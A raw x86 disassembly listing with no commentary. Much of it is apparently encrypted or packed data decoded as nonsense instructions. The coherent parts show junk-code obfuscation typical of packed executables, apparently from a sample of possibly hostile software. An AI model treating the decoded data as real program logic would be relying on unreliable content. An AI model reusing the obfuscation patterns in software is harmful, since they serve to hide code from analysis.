  40486f:	call   0x20fd:0xdf89df57
  404876:	jle    0x4048a2
  404878:	ins    BYTE PTR es:[edi],dx
  404879:	xchg   BYTE PTR [ecx+0x37],al
  40487c:	cdq    
  40487d:	retf   0xd74f
  404880:	mov    edx,0x66c64bf7
  404885:	aaa    
  404886:	ds pop ss
  404888:	(bad)  
  404889:	xchg   ecx,eax
  40488a:	enter  0x311d,0xed
  40488e:	shl    BYTE PTR [eax-0x1ab7d8ec],1
  404894:	retf   0xa8e6
  404897:	push   ecx
  404898:	adc    esi,esi
  40489a:	mov    al,ds:0xc3b9ddb8
  40489f:	mov    dh,0xab
  4048a1:	ror    cl,1
  4048a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048a4:	jno    0x40487e
  4048a6:	add    dh,BYTE PTR [ebx+0x463a09e2]
  4048ac:	adc    esi,DWORD PTR [ebx+0xe]
  4048af:	mov    edi,0xe167b3a0
  4048b4:	mov    bl,0x4c
  4048b6:	sub    BYTE PTR [edi-0x28a2cf5d],al
  4048bc:	push   ebp
  4048bd:	xchg   edx,eax
  4048be:	push   ebx
  4048bf:	or     edi,DWORD PTR [eax]
  4048c1:	pop    edi
  4048c2:	jg     0x404872
  4048c4:	sub    DWORD PTR [eax+0x39],0x6a
  4048c8:	ret    
  4048c9:	push   0xe7f140cf
  4048ce:	aam    0x8a
  4048d0:	and    BYTE PTR [eax],cl
  4048d2:	(bad)  
  4048d3:	hlt    
  4048d4:	int3   
  4048d5:	in     al,0xf4
  4048d7:	mov    ecx,0x383d105c
  4048dc:	sbb    esi,DWORD PTR [edi+edx*1]
  4048df:	dec    ecx
  4048e0:	mov    bh,BYTE PTR [eax]
  4048e2:	add    ebx,DWORD PTR [ebx-0x50]
  4048e5:	cmp    eax,0xf44344d4
  4048ea:	fnstsw WORD PTR [esi]
  4048ec:	mov    eax,0x7cc1a3d3
  4048f1:	add    al,BYTE PTR [esi+ebx*2-0x18]
  4048f5:	xchg   BYTE PTR [edx+0x439d609b],bh
  4048fb:	icebp  
  4048fc:	scas   al,BYTE PTR es:[edi]
  4048fd:	dec    ebx
  4048fe:	bnd ret 
  404900:	hlt    
  404901:	popf   
  404902:	xchg   ebp,eax
  404903:	pop    ecx
  404904:	hlt    
  404905:	mov    edi,0x2646a3eb
  40490a:	fs mov cl,0x23
  40490e:	ja     0x404902
  404910:	or     eax,eax
  404912:	jns    0x40490a
  404914:	arpl   WORD PTR ds:0x747f592f,si
  40491a:	or     ch,BYTE PTR [esi-0xf]
  40491d:	push   esi
  40491e:	pop    eax
  40491f:	sbb    BYTE PTR [ecx-0x5dcac424],dh
  404925:	jnp    0x404975
  404927:	xchg   ecx,eax
  404928:	dec    edi
  404929:	jnp    0x4048e6
  40492b:	mov    bh,0x11
  40492d:	pop    edi
  40492e:	or     eax,0xc1bfd550
  404933:	push   edi
  404934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404935:	in     al,0xfe
  404937:	pop    ds
  404938:	das    
  404939:	jb     0x404960
  40493b:	rol    DWORD PTR [edx],0xb4
  40493e:	cmp    ch,BYTE PTR ds:0xef44a8c5
  404945:	cmp    DWORD PTR [edi],0xffffffe6
  404948:	test   eax,0x74b20412
  40494d:	mov    dh,0xa
  40494f:	sbb    dh,bh
  404951:	shl    DWORD PTR [ebx],0x49
  404954:	les    ecx,FWORD PTR [edi+0x7]
  404957:	gs push es
  404959:	icebp  
  40495a:	ror    dl,0x84
  40495d:	int    0xa7
  40495f:	ficom  WORD PTR [ecx+0x33811a3b]
  404965:	dec    ebp
  404966:	call   0x1a905a2a
  40496b:	adc    eax,0x49b3174a
  404970:	scas   eax,DWORD PTR es:[edi]
  404971:	test   BYTE PTR [ebp-0x31],al
  404974:	mov    esp,0xa73678ab
  404979:	jae    0x40493e
  40497b:	jg     0x40491e
  40497d:	add    BYTE PTR [esi-0x335229dc],al
  404983:	test   DWORD PTR [ebx],esp
  404985:	dec    DWORD PTR [ecx+0x73c3371f]
  40498b:	ins    DWORD PTR es:[edi],dx
  40498c:	lods   al,BYTE PTR ds:[esi]
  40498d:	out    0x46,al
  40498f:	dec    edx
  404990:	dec    ecx
  404991:	inc    eax
  404992:	ss cmp ecx,esp
  404995:	pop    es
  404996:	mov    al,es:0x7973fe6
  40499c:	mov    eax,DWORD PTR [edx+0x12]
  40499f:	push   edx
  4049a0:	lds    eax,FWORD PTR [ebp+eiz*8+0x6384c541]
  4049a7:	push   0xc1abb307
  4049ac:	xor    dh,al
  4049ae:	adc    ebp,esi
  4049b0:	out    dx,eax
  4049b1:	push   edx
  4049b2:	push   eax
  4049b3:	(bad)  
  4049b4:	jmp    0x11e:0xbbfc6dd8
  4049bb:	sti    
  4049bc:	pslld  mm5,QWORD PTR [ebp+0x1b5b1699]
  4049c3:	or     edi,ecx
  4049c5:	int3   
  4049c6:	push   ss
  4049c7:	sar    BYTE PTR [ecx+ebx*4],0xa0
  4049cb:	mov    DWORD PTR [ebx],ecx
  4049cd:	and    eax,0xfef75a36
  4049d2:	aad    0x5e
  4049d4:	xchg   esp,eax
  4049d5:	inc    esi
  4049d6:	sub    ch,bl
  4049d8:	jo     0x404983
  4049da:	jp     0x4049b7
  4049dc:	or     DWORD PTR [ebp+0x33e5e297],esp
  4049e2:	dec    edx
  4049e3:	mov    ebp,0xb99040ad
  4049e8:	xchg   ebx,eax
  4049e9:	adc    ebx,DWORD PTR [esi+0x4a]
  4049ec:	xor    DWORD PTR [eax-0x8],eax
  4049ef:	cmovb  ebp,DWORD PTR [edi-0x3117b563]
  4049f6:	fwait
  4049f7:	mov    ah,0xcd
  4049f9:	and    esp,ecx
  4049fb:	sub    DWORD PTR [esi+0x49819f50],ebx
  404a01:	out    0xae,al
  404a03:	in     al,dx
  404a04:	cs pop ss
  404a06:	fwait
  404a07:	jp     0x404a81
  404a09:	jge    0x404a1e
  404a0b:	dec    ebp
  404a0c:	and    edi,edx
  404a0e:	repz pop ss
  404a10:	jb     0x4049ef
  404a12:	jp     0x404a67
  404a14:	push   cs
  404a15:	dec    esi
  404a16:	pop    ebx
  404a17:	pushf  
  404a18:	add    ebx,edi
  404a1a:	or     eax,0x215e8b78
  404a1f:	into   
  404a20:	test   eax,0x646ccae4
  404a25:	retf   
  404a26:	in     al,dx
  404a27:	xchg   esp,eax
  404a28:	(bad)  
  404a29:	mov    dl,0xf2
  404a2b:	shl    ah,0x2f
  404a2e:	inc    edx
  404a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a30:	cwde   
  404a31:	pop    edx
  404a32:	loop   0x4049fc
  404a34:	test   al,0x56
  404a36:	test   DWORD PTR gs:[ebx-0x48067368],ebp
  404a3d:	hlt    
  404a3e:	pop    ss
  404a3f:	imul   esi,ebx,0x2f
  404a42:	(bad)  
  404a43:	(bad)  
  404a44:	rol    BYTE PTR [ebx-0x3f5b9998],0xe4
  404a4b:	xchg   esi,eax
  404a4c:	sar    BYTE PTR [ebx+0x51],1
  404a4f:	sbb    al,0x9
  404a51:	mov    edx,DWORD PTR ds:0x7fc69435
  404a57:	shr    BYTE PTR [edi-0x5c9f3227],cl
  404a5d:	adc    al,BYTE PTR [edi-0x47]
  404a60:	mov    ebp,0x2ae8c8a6
  404a65:	mov    cl,0x7d
  404a67:	add    DWORD PTR ds:0xddf2afb4,ecx
  404a6d:	jg     0x404aab
  404a6f:	pop    edi
  404a70:	pop    esi
  404a71:	pop    ebx
  404a72:	leave  
  404a73:	ret    
  404a74:	push   ebp
  404a75:	mov    ebp,esp
  404a77:	sub    esp,0x2c
  404a7a:	leave  
  404a7b:	ret    0x10
  404a7e:	push   ebp
  404a7f:	mov    ebp,esp
  404a81:	sub    esp,0x44
  404a84:	adc    DWORD PTR ds:0x43383f,edi
  404a8a:	push   edi
  404a8b:	mov    eax,DWORD PTR [ebp+0xc]
  404a8e:	mov    edx,DWORD PTR ds:0x4337b7
  404a94:	and    DWORD PTR ds:0x433803,edx
  404a9a:	mov    DWORD PTR [ebp-0x10],eax
  404a9d:	adc    DWORD PTR ds:0x43372b,0x2679
  404aa7:	mov    eax,DWORD PTR [ebp+0x8]
  404aaa:	xor    ecx,DWORD PTR ds:0x43376b
  404ab0:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  404ab7:	mov    DWORD PTR ds:0x43382b,0x7030
  404ac1:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  404ac8:	and    DWORD PTR ds:0x4337c3,0x0
  404ad2:	mov    edi,DWORD PTR ds:0x4337c3
  404ad8:	inc    edi
  404ad9:	mov    DWORD PTR ds:0x4337c3,edi
  404adf:	cmp    DWORD PTR ds:0x4337c3,0x6
  404ae6:	jne    0x404af5
  404aec:	push   DWORD PTR [ebp-0x18]
  404aef:	call   DWORD PTR ds:0x412358
  404af5:	cmp    DWORD PTR ds:0x4337c3,0x5
  404afc:	jne    0x404b0f
  404b02:	mov    edi,DWORD PTR ds:0x4337c3
  404b08:	inc    edi
  404b09:	mov    DWORD PTR ds:0x4337c3,edi
  404b0f:	cmp    DWORD PTR ds:0x4337c3,0x14
  404b16:	jb     0x404ad2
  404b1c:	jmp    0x404e76
  404b21:	push   ecx
  404b22:	mov    esi,0xf1913591
  404b27:	jno    0x404b83
  404b29:	ins    DWORD PTR es:[edi],dx
  404b2a:	inc    ebp
  404b2b:	fild   WORD PTR [ecx+0x67771f45]
  404b31:	xor    ebp,DWORD PTR ds:0x7d337e7e
  404b37:	jle    0x404bb7
  404b39:	xor    al,0x12
  404b3b:	scas   al,BYTE PTR es:[edi]
  404b3c:	rcl    DWORD PTR [ecx-0x17e1d402],1
  404b42:	adc    ebp,ebx
  404b44:	imul   ebp,DWORD PTR [esi+0x24],0xb3beb347
  404b4b:	loop   0x404b8d
  404b4d:	call   0xbf2aee55
  404b52:	punpckhdq mm6,QWORD PTR [ebx-0x65]
  404b56:	adc    cl,bh
  404b58:	or     dl,BYTE PTR [edi-0x6cb9beb5]
  404b5e:	sti    
  404b5f:	test   ch,bl
  404b61:	ins    DWORD PTR es:[edi],dx
  404b62:	jnp    0x404bc9
  404b64:	les    esi,FWORD PTR [esi+edx*1]
  404b67:	aam    0x11
  404b69:	data16 adc dl,ch
  404b6c:	(bad)  
  404b6d:	jp     0x404bcc
  404b6f:	daa    
  404b70:	jg     0x404bdd
  404b72:	mov    fs,ecx
  404b74:	cwde   
  404b75:	jno    0x404b11
  404b77:	and    ch,BYTE PTR ds:0x21615761
  404b7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b7e:	push   ss
  404b7f:	rcr    DWORD PTR [esi],0x44
  404b82:	mov    ?,WORD PTR [ecx]
  404b84:	cmp    BYTE PTR [edx+0x75],ah
  404b87:	jge    0x404bd7
  404b89:	mov    DWORD PTR [edi-0x12],0xa4bd2540
  404b90:	pusha  
  404b91:	cdq    
  404b92:	or     eax,0x9c7cb0c6
  404b97:	stos   DWORD PTR es:[edi],eax
  404b98:	jmp    esi
  404b9a:	mov    dl,0xd0
  404b9c:	mov    al,ds:0xeb266377
  404ba1:	aad    0x73
  404ba3:	jne    0x404b77
  404ba5:	push   edx
  404ba6:	sub    cl,dh
  404ba8:	popa   
  404ba9:	adc    DWORD PTR [edi-0x48bfb446],0xfffffff0
  404bb0:	int    0xaf
  404bb2:	xchg   edi,eax
  404bb3:	pop    esp
  404bb4:	in     al,dx
  404bb5:	mov    ds:0x8c7e83b9,eax
  404bba:	fidiv  WORD PTR [ecx+ebx*4-0x185311f4]
  404bc1:	push   ebp
  404bc2:	adc    DWORD PTR [ebx-0x470163ac],edx
  404bc8:	inc    esp
  404bc9:	add    eax,0xf77fb498
  404bce:	xchg   edx,eax
  404bcf:	dec    ebp
  404bd0:	push   ecx
  404bd1:	mov    esp,0xf8053249
  404bd6:	xchg   DWORD PTR ss:[ecx],esi
  404bd9:	stos   BYTE PTR es:[edi],al
  404bda:	ret    0x9678
  404bdd:	xchg   ebx,eax
  404bde:	dec    esi
  404bdf:	outs   dx,BYTE PTR ds:[esi]
  404be0:	and    al,0x6
  404be2:	dec    ecx
  404be3:	leave  
  404be4:	ins    DWORD PTR es:[edi],dx
  404be5:	xor    DWORD PTR [ebx-0x206d9138],edx
  404beb:	pop    ss
  404bec:	sbb    BYTE PTR [ebp+0x773b0b6b],bl
  404bf2:	jb     0x404b81
  404bf4:	mov    DWORD PTR es:[ebx+0x65c5a228],esi
  404bfb:	jg     0x404c4d
  404bfd:	ins    BYTE PTR es:[edi],dx
  404bfe:	mov    al,0xa1
  404c00:	cmp    eax,0xac15dd2f
  404c05:	mov    WORD PTR [ebp-0x67],cs
  404c08:	add    BYTE PTR [edx+0x49],al
  404c0b:	repz push edx
  404c0d:	pop    esi
  404c0e:	mov    edx,0xec47425e
  404c13:	sbb    ch,dl
  404c15:	fdivrp st(5),st
  404c17:	or     al,cl
  404c19:	into   
  404c1a:	inc    ebx
  404c1b:	in     al,dx
  404c1c:	adc    dl,BYTE PTR [esp+ecx*8+0x5]
  404c20:	(bad)  
  404c21:	jb     0x404c4e
  404c23:	adc    BYTE PTR [ebp+0x3e],cl
  404c26:	push   ebx
  404c27:	shl    edx,0x3a
  404c2a:	or     BYTE PTR [ecx],0xf1
  404c2d:	jae    0x404c04
  404c2f:	and    eax,0xac4aaec3
  404c34:	sub    al,0xe
  404c36:	xchg   edi,eax
  404c37:	mov    fs,WORD PTR [ebx]
  404c39:	mov    dl,BYTE PTR [ebp+0x6c]
  404c3c:	(bad)  
  404c3e:	pop    ss
  404c3f:	push   ebp
  404c40:	into   
  404c41:	mov    al,0x94
  404c43:	retf   
  404c44:	data16 mov al,0xbf
  404c47:	int    0x82
  404c49:	xchg   ecx,eax
  404c4a:	push   ebp
  404c4b:	sbb    esi,DWORD PTR [ebx-0x16]
  404c4e:	or     DWORD PTR [edx+0x1],edx
  404c51:	mov    ebx,fs
  404c53:	adc    eax,0xaed13dfa
  404c58:	out    0x88,al
  404c5a:	adc    cl,BYTE PTR [edi+eax*1+0x12]
  404c5e:	gs pop ecx
  404c60:	aam    0x44
  404c62:	push   esi
  404c63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c64:	mov    cl,0x31
  404c66:	jnp    0x404cd2
  404c68:	ins    BYTE PTR es:[edi],dx
  404c69:	pop    esp
  404c6a:	jns    0x404c3a
  404c6c:	push   eax
  404c6d:	mov    cl,0x69
  404c6f:	scas   al,BYTE PTR es:[edi]
  404c70:	inc    esi
  404c71:	ins    DWORD PTR es:[edi],dx
  404c72:	leave  
  404c73:	mov    eax,0xad6d8d00
  404c78:	jnp    0x404ce0
  404c7a:	test   eax,0x6de6cc4f
  404c7f:	(bad)  
  404c80:	xchg   edi,eax
  404c81:	je     0x404cea
  404c83:	mov    WORD PTR [ecx+eiz*2+0x5590ed87],gs
  404c8a:	retf   
  404c8b:	jp     0x404c41
  404c8d:	out    dx,eax
  404c8e:	adc    al,0x5a
  404c90:	and    BYTE PTR [edx],dh
  404c92:	das    
  404c93:	cmp    DWORD PTR [esi+0x79],ebx
  404c96:	imul   esi,DWORD PTR fs:[edx+0x7f6934be],0x746bc385
  404ca1:	cmp    BYTE PTR [eax-0x75],bh
  404ca4:	je     0x404d07
  404ca6:	xchg   BYTE PTR [edx+0x72],bh
  404ca9:	jmp    0x404c98
  404cab:	inc    esp
  404cac:	cdq    
  404cad:	xor    eax,0x99165f76
  404cb2:	push   ecx
  404cb3:	push   ds
  404cb4:	or     dh,bh
  404cb6:	and    BYTE PTR [ebx-0xc],0xf
  404cba:	into   
  404cbb:	jmp    0x5ac2:0x1b815f45
  404cc2:	cmp    edx,DWORD PTR [eax]
  404cc4:	pop    esp
  404cc5:	xor    BYTE PTR [edi+eiz*4],0xe0
  404cc9:	(bad)  
  404cca:	xor    DWORD PTR [eax-0x5f59057f],ebp
  404cd0:	lahf   
  404cd1:	dec    esi
  404cd2:	pop    edi
  404cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cd4:	add    ch,BYTE PTR [eax]
  404cd6:	mov    ds:0xb0cc8bbf,al
  404cdb:	nop
  404cdc:	xchg   esp,eax
  404cdd:	ror    BYTE PTR [eax],cl
  404cdf:	je     0x404d3a
  404ce1:	fistp  DWORD PTR [edi-0x6a]
  404ce4:	pop    ebx
  404ce5:	dec    edx
  404ce6:	mov    cl,0xd2
  404ce8:	lahf   
  404ce9:	dec    DWORD PTR [edi]
  404ceb:	and    DWORD PTR ds:0xd007fa0c,eax
  404cf1:	xchg   si,ax
  404cf3:	mov    al,0xf6
  404cf5:	jge    0x404d1b
  404cf7:	jb     0x404cb1
  404cf9:	pop    ds
  404cfa:	ds cmp eax,0xf3e27eef
  404d00:	inc    esi
  404d01:	mov    ecx,0xa0e03b08
  404d06:	addr16 das 
  404d08:	adc    ebx,DWORD PTR [esi+0xd]
  404d0b:	cli    
  404d0c:	xchg   ebp,eax
  404d0e:	into   
  404d0f:	mov    edi,0xbbea72c6
  404d14:	xor    eax,0x4c065fd9
  404d19:	mov    ds:0xdeea26e6,eax
  404d1e:	leave  
  404d1f:	mov    dh,0xa2
  404d21:	xchg   esp,eax
  404d22:	ds retf 
  404d24:	cli    
  404d25:	scas   eax,DWORD PTR es:[edi]
  404d26:	cwde   
  404d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d28:	enter  0x43ed,0x2d
  404d2c:	fmul   DWORD PTR [ebx-0x3b]
  404d2f:	fiadd  DWORD PTR [esi+0x58]
  404d32:	shr    ecx,cl
  404d34:	and    eax,0xd49dfb9b
  404d39:	sbb    DWORD PTR [esi-0x182ee5af],ebp
  404d3f:	dec    ebp
  404d40:	jp     0x404ccb
  404d42:	pop    ebp
  404d43:	out    0x51,al
  404d45:	push   eax
  404d46:	or     edi,DWORD PTR [esp+eax*1]
  404d49:	jg     0x404d2d
  404d4b:	mov    ds:0xd513341,eax
  404d50:	call   0xae43:0x363291e
  404d57:	jns    0x404d22
  404d59:	sub    al,0x6
  404d5b:	adc    BYTE PTR [eax+0x8],al
  404d5e:	pusha  
  404d5f:	ins    DWORD PTR es:[edi],dx
  404d60:	push   ss
  404d61:	pop    edx
  404d62:	aad    0x80
  404d64:	lods   eax,DWORD PTR ds:[esi]
  404d65:	sub    eax,0x68c74e2e
  404d6a:	fistp  QWORD PTR [ecx]
  404d6c:	xchg   esp,eax
  404d6d:	mov    DWORD PTR [edi],0x92c08859
  404d73:	add    esp,esi
  404d75:	inc    eax
  404d76:	inc    edi
  404d77:	pop    ecx
  404d78:	jecxz  0x404d30
  404d7a:	shl    DWORD PTR [eax+0x46],0x88
  404d7e:	xchg   esp,eax
  404d7f:	jo     0x404d33
  404d81:	mov    ebp,0x9c4f6e7b
  404d86:	fs out 0x10,eax
  404d89:	leave  
  404d8a:	out    dx,eax
  404d8b:	jo     0x404d3f
  404d8d:	out    dx,eax
  404d8e:	cld    
  404d8f:	mov    al,0xe1
  404d91:	in     eax,0x2e
  404d93:	popa   
  404d94:	dec    eax
  404d95:	outs   dx,DWORD PTR ds:[esi]
  404d96:	jne    0x404d34
  404d98:	xchg   esp,eax
  404d99:	aad    0x30
  404d9b:	mov    dl,0xf1
  404d9d:	in     eax,dx
  404d9e:	dec    edi
  404d9f:	fistp  WORD PTR [edi]
  404da1:	mov    esp,0x2fcf0b0a
  404da6:	aaa    
  404da7:	mov    dl,0xec
  404da9:	cmp    BYTE PTR [esi-0x52729265],cl
  404daf:	mov    esi,0xab9b3282
  404db4:	and    ecx,edi
  404db6:	adc    al,0x10
  404db8:	and    ebp,DWORD PTR [edx-0x5552c122]
  404dbe:	xchg   DWORD PTR [edi-0x3126f25c],esi
  404dc4:	jbe    0x404d88
  404dc6:	in     al,0xf7
  404dc8:	(bad)  
  404dc9:	test   al,0xa8
  404dcb:	pop    ss
  404dcc:	fild   WORD PTR [ebx+0x1af14342]
  404dd2:	ja     0x404daa
  404dd4:	add    DWORD PTR [ecx+0x6f6b531c],ecx
  404dda:	in     eax,0xd0
  404ddc:	jp     0x404e35
  404dde:	pop    ebx
  404ddf:	fst    st(7)
  404de1:	ror    BYTE PTR [edi+0x12],0x32
  404de5:	aaa    
  404de6:	add    BYTE PTR [edx+0x77],dl
  404de9:	fsubr  QWORD PTR [esi+0x1aa495be]
  404def:	mov    bh,0xa5
  404df1:	sbb    bh,BYTE PTR [esi+0x3ad51549]
  404df7:	mov    al,0x89
  404df9:	loop   0x404e07
  404dfb:	popf   
  404dfc:	add    dl,BYTE PTR [esi-0x3d]
  404dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e00:	das    
  404e01:	sbb    DWORD PTR [edx-0x56],ecx
  404e04:	stos   BYTE PTR es:[edi],al
  404e05:	jnp    0x404dc9
  404e07:	imul   edi,DWORD PTR [esi+ebx*2+0x60],0x10d3cc51
  404e0f:	push   ebx
  404e10:	bound  ebx,QWORD PTR [eax+eiz*1]
  404e13:	pop    esi
  404e14:	aam    0xb7
  404e16:	sbb    al,0x56
  404e18:	mov    esi,DWORD PTR [esp+ecx*4-0x9b9cf65]
  404e1f:	std    
  404e20:	cmp    eax,0x70899d60
  404e25:	or     BYTE PTR [ebp-0x6da1f8de],cl
  404e2b:	xchg   esp,eax
  404e2c:	(bad)  
  404e2e:	lods   al,BYTE PTR ds:[esi]
  404e2f:	xor    esi,DWORD PTR [edi+0x6]
  404e32:	data16 aas 
  404e34:	lods   eax,DWORD PTR ds:[esi]
  404e35:	xchg   edi,eax
  404e36:	mov    ds:0x409bfb59,eax
  404e3b:	fcom   st(7)
  404e3d:	test   eax,0x34284ea2
  404e42:	shr    ebx,cl
  404e44:	dec    eax
  404e45:	inc    ecx
  404e46:	loope  0x404ddb
  404e48:	ret    0x855a
  404e4b:	in     eax,dx
  404e4c:	pop    ebx
  404e4d:	outs   dx,BYTE PTR ds:[esi]
  404e4e:	push   0xb5523caf
  404e53:	pop    eax
  404e54:	mov    bh,0xac
  404e56:	ja     0x404e3b
  404e58:	sahf   
  404e59:	outs   dx,BYTE PTR ds:[esi]
  404e5a:	in     al,0xb8
  404e5c:	pop    edi
  404e5d:	daa    
  404e5e:	fmul   QWORD PTR [esi-0x5ec7658e]
  404e64:	push   edi
  404e65:	mov    ds,WORD PTR [ebx+0x23]
  404e68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e69:	das    
  404e6a:	ss jbe 0x404e93
  404e6d:	jge    0x404e81
  404e6f:	ficom  DWORD PTR [ecx-0x291e303]
  404e75:	jmp    0x59d1:0x8108558b
  404e7c:	jae    0x404e7e
  404e7e:	add    BYTE PTR [ecx+0x54b8c045],cl
  404e84:	or     BYTE PTR [ecx+0x7],dl
  404e87:	xor    edx,eax
  404e89:	adc    DWORD PTR ds:0x43371b,0x3221
  404e93:	mov    ecx,0x32729b
  404e98:	mov    edi,DWORD PTR ds:0x4337e7
  404e9e:	adc    DWORD PTR ds:0x43377f,edi
  404ea4:	add    edx,ecx
  404ea6:	neg    edi
  404ea8:	mov    DWORD PTR [ebp-0x8],edx
  404eab:	mov    DWORD PTR ds:0x4337eb,0x10
  404eb5:	cmp    DWORD PTR ds:0x4337eb,0x0
  404ebc:	je     0x404f14
  404ec2:	cmp    DWORD PTR ds:0x4337eb,0x9
  404ec9:	jne    0x404ee2
  404ecf:	push   0x6f04
  404ed4:	push   0x5d47
  404ed9:	push   DWORD PTR [ebp-0x1c]
  404edc:	call   DWORD PTR ds:0x41235c
  404ee2:	cmp    DWORD PTR ds:0x4337eb,0xa
  404ee9:	jne    0x404efc
  404eef:	mov    edi,DWORD PTR ds:0x4337eb
  404ef5:	dec    edi
  404ef6:	mov    DWORD PTR ds:0x4337eb,edi
  404efc:	mov    edi,DWORD PTR ds:0x4337eb
  404f02:	dec    edi
  404f03:	mov    DWORD PTR ds:0x4337eb,edi
  404f09:	jmp    0x404eb5
  404f0e:	and    DWORD PTR ds:0x43383f,ecx
  404f14:	mov    edx,DWORD PTR [ebp+0x8]
  404f17:	sbb    edi,DWORD PTR ds:0x4337eb
  404f1d:	xor    edx,eax
  404f1f:	sbb    edi,DWORD PTR ds:0x4337bf
  404f25:	add    edx,ecx
  404f27:	and    DWORD PTR ds:0x43383b,0x0
  404f31:	xor    edi,edi
  404f33:	add    edi,DWORD PTR ds:0x43383b
  404f39:	inc    edi
  404f3a:	mov    DWORD PTR ds:0x43383b,edi
  404f40:	cmp    DWORD PTR ds:0x43383b,0xc
  404f47:	jne    0x404f58
  404f4d:	push   0x3fd8
  404f52:	call   DWORD PTR ds:0x412000
  404f58:	cmp    DWORD PTR ds:0x43383b,0xb
  404f5f:	jne    0x404f72
  404f65:	mov    edi,DWORD PTR ds:0x43383b
  404f6b:	inc    edi
  404f6c:	mov    DWORD PTR ds:0x43383b,edi
  404f72:	cmp    DWORD PTR ds:0x43383b,0x17
  404f79:	jb     0x404f31
  404f7f:	mov    DWORD PTR [ebp+0xc],edx
  404f82:	mov    DWORD PTR ds:0x433737,0x5f27
  404f8c:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  404f93:	xor    DWORD PTR ds:0x433767,edi
  404f99:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  404fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  404fa7:	sbb    DWORD PTR ds:0x4337ef,edi
  404fad:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  404fb4:	adc    DWORD PTR ds:0x43370f,ecx
  404fba:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  404fc1:	movzx  edi,WORD PTR ds:0x433767
  404fc8:	and    DWORD PTR ds:0x433713,edi
  404fce:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  404fd5:	dec    edx
  404fd6:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  404fdd:	mov    edx,DWORD PTR [ebp+0x8]
  404fe0:	add    DWORD PTR ds:0x4337e7,ebx
  404fe6:	xor    edx,eax
  404fe8:	add    edi,0x469e
  404fee:	mov    edi,DWORD PTR [ebp-0x10]
  404ff1:	add    edx,ecx
  404ff3:	cmp    edi,edx
  404ff5:	mov    DWORD PTR ds:0x43382f,0x53a
  404fff:	je     0x40685f
  405005:	mov    DWORD PTR ds:0x433837,0x2c13
  40500f:	push   ebx
  405010:	mov    DWORD PTR ds:0x4337ef,0x2429
  40501a:	jmp    0x40683a
  40501f:	mov    edx,DWORD PTR [ebp-0x8]
  405022:	and    DWORD PTR ds:0x433727,0x0
  40502c:	mov    edi,DWORD PTR ds:0x433727
  405032:	inc    edi
  405033:	mov    DWORD PTR ds:0x433727,edi
  405039:	cmp    DWORD PTR ds:0x433727,0x6
  405040:	jne    0x40505d
  405046:	push   DWORD PTR [ebp-0x14]
  405049:	push   DWORD PTR [ebp-0x10]
  40504c:	push   DWORD PTR [ebp-0xc]
  40504f:	push   DWORD PTR [ebp-0x18]
  405052:	push   0x82f7
  405057:	call   DWORD PTR ds:0x41236c
  40505d:	cmp    DWORD PTR ds:0x433727,0x5
  405064:	jne    0x405079
  40506a:	xor    edi,edi
  40506c:	xor    edi,DWORD PTR ds:0x433727
  405072:	inc    edi
  405073:	mov    DWORD PTR ds:0x433727,edi
  405079:	cmp    DWORD PTR ds:0x433727,0x17
  405080:	jb     0x40502c
  405086:	xor    edi,edi
  405088:	add    edi,DWORD PTR ds:0x4337ff
  40508e:	add    DWORD PTR ds:0x4337bb,edi
  405094:	mov    edi,DWORD PTR [ebp-0x10]
  405097:	sub    edi,edx
  405099:	mov    edx,DWORD PTR [ebp-0x4]
  40509c:	xor    edx,eax
  40509e:	add    edx,ecx
  4050a0:	mov    DWORD PTR ds:0x4337eb,0x78fa
  4050aa:	cmp    edi,edx
  4050ac:	mov    DWORD PTR ds:0x43383b,0x49ec
  4050b6:	jb     0x40685e
  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x43383b
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x4337fb
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x433727,0x4337b7
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43371f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x4337eb,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x4337ff,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x4337ff
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x4337ff,edx
  40512b:	cmp    DWORD PTR ds:0x4337ff,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x4337ff,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4337eb,0x43376f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4337e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	sub    eax,0xf49363ee
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
